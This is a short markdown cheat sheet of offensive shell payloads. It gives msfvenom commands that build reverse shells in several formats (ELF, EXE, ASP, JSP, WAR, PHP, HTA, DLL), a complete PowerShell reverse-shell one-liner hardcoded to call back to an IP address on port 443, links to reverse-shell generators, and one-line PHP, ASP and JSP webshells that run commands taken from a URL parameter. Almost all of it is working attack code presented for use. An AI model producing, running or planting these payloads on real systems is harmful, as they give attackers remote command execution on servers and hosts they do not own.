# Shells

## Reverse shells


#### Linux - MSFVenom
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

#### Windows - MSFVenom
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

#### Powershell
```
powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.194',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
#### ASP
```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```
#### ASPX
```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > shell.aspx
```
#### JSP
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
```
#### WAR
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
```
#### PHP
```
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```
#### HTA
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh > shell.hta
```

#### DLL
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > shell.dll
```


#### Online Generator
<https://www.revshells.com/>

<https://weibell.github.io/reverse-shell-generator/>



## Single line Webshell

#### PHP
```
<?php echo passthru($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
```
#### ASP
```
<% eval request("cmd") %>
```
#### JSP
```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
